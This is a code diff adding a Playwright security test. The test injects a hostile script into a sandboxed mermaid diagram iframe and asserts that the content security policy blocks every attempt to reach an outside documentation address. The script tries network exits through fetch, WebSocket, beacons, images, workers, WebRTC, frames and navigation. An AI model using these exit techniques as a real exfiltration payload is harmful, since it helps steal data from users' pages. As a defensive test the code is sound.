@@ -381,3 +381,86 @@ test("blob URLs are released when the diagram goes away", async ({ page, baseURL
     .poll(() => page.evaluate(() => (window as unknown as { __revoked: string[] }).__revoked))
     .toContain(src);
 });
+
+test("a contaminated diagram frame cannot reach the network: fetch, sockets, images, WebRTC, frames, navigation", async ({
+  page,
+}) => {
+  await useAccount(page, MOM);
+  // The outside address (198.51.100.0/24 is reserved for documentation) answers every request it really gets, so a
+  // leak shows up as a response; a request the browser refuses fails with its CSP reason before it leaves.
+  const reached: string[] = [];
+  const refused = new Map<string, string>();
+  await page.context().route("http://198.51.100.7/**", (route) => {
+    reached.push(route.request().url());
+    return route.fulfill({ status: 200, body: "ok" });
+  });
+  page.on("requestfailed", (r) => {
+    if (r.url().includes("198.51.100.")) refused.set(r.url(), r.failure()?.errorText ?? "");
+  });
+  await page.goto("/settings");
+  // A frame of our page as the app makes it, given a hostile bundle instead of mermaid's (as if mermaid had a hole
+  // that let diagram text run as script): it tries every way out it can and reports what it got.
+  const report = await page.evaluate(async () => {
+    const f = document.createElement("iframe");
+    f.setAttribute("sandbox", "allow-scripts");
+    f.src = "/mermaid-frame";
+    const code = `(async () => {
+      const r = {};
+      const X = "http://198.51.100.7";
+      r.rtcGlobals = Object.getOwnPropertyNames(window).filter((n) => /RTC/.test(n) && window[n] !== undefined);
+      r.rtc = typeof RTCPeerConnection;
+      try { new window.webkitRTCPeerConnection({}); r.webkitRtc = "made"; } catch (e) { r.webkitRtc = "blocked"; }
+      try { await fetch(X + "/fetch"); r.fetch = "ok"; } catch { r.fetch = "blocked"; }
+      try { const x = new XMLHttpRequest(); x.open("GET", X + "/xhr"); x.send(); } catch {}
+      try { new WebSocket("ws://198.51.100.7/ws"); } catch {}
+      try { new EventSource(X + "/es"); } catch {}
+      try { navigator.sendBeacon(X + "/beacon", "x"); } catch {}
+      const img = new Image(); img.src = X + "/img.png"; document.body.append(img);
+      const css = document.createElement("style"); css.textContent = "body{background:url(" + X + "/css.png)}"; document.head.append(css);
+      const link = document.createElement("link"); link.rel = "prefetch"; link.href = X + "/prefetch"; document.head.append(link);
+      // worker-src 'none': the worker never loads (an error event, not a throw), so its fetch never happens.
+      try {
+        const wk = new Worker(URL.createObjectURL(new Blob(["fetch('" + X + "/worker')"])));
+        r.worker = await new Promise((z) => {
+          wk.onerror = () => z("blocked");
+          setTimeout(() => z("ran?"), 400);
+        });
+      } catch {
+        r.worker = "blocked";
+      }
+      const child = document.createElement("iframe"); child.src = X + "/child"; document.body.append(child);
+      const blank = document.createElement("iframe"); document.body.append(blank);
+      try { r.blankRtc = typeof blank.contentWindow.RTCPeerConnection; } catch { r.blankRtc = "cross-origin"; }
+      try { window.open(X + "/popup"); } catch {}
+      try { top.location.href = X + "/top"; } catch (e) { r.top = "blocked"; }
+      await new Promise((z) => setTimeout(z, 500));
+      parent.postMessage({ type: "contaminated", r }, "*");
+      setTimeout(() => { location.href = X + "/self?leak=1"; }, 50);
+    })();`;
+    return new Promise((resolve) => {
+      addEventListener("message", (e) => {
+        if (e.source !== f.contentWindow) return;
+        const d = e.data as { type?: string; r?: unknown };
+        if (d?.type === "agentlee:mermaid-boot")
+          f.contentWindow!.postMessage({ type: "agentlee:mermaid-code", code }, "*");
+        if (d?.type === "contaminated") resolve(d.r);
+      });
+      document.body.append(f);
+    });
+  });
+  expect(report).toMatchObject({
+    rtcGlobals: [],
+    rtc: "undefined",
+    webkitRtc: "blocked",
+    fetch: "blocked",
+    worker: "blocked",
+    blankRtc: "cross-origin",
+    top: "blocked",
+  });
+  // The frame's attempt to navigate itself away (refused by the app page's CSP) and everything else: no request
+  // ever left for the outside address.
+  await page.waitForTimeout(1500);
+  expect(reached).toEqual([]);
+  for (const [url, why] of refused) expect(why, url).toMatch(/BLOCKED_BY_CSP|csp/i);
+  expect(page.url()).toMatch(/\/settings$/);
+});
